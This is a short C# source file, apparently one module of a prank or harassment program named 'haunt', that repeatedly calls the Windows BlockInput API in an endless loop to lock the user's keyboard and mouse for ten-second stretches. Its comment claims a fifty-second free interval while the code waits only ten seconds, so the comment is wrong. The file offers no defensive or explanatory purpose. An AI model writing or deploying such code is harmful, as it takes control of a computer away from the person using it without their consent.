using System;
using System.Collections.Generic;

using System.Text;
using System.Runtime.InteropServices;
using System.Threading;

namespace haunt
{
    class LockInput
    {
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool fBlockIt);

        public static void Start()
        {
            while (true)
            {
                BlockInput(true);

                // lock for 10 seconds
                Thread.Sleep(10000);

                BlockInput(false);

                // free for 50 seconds
                Thread.Sleep(10000);
            }
        }
    }
}
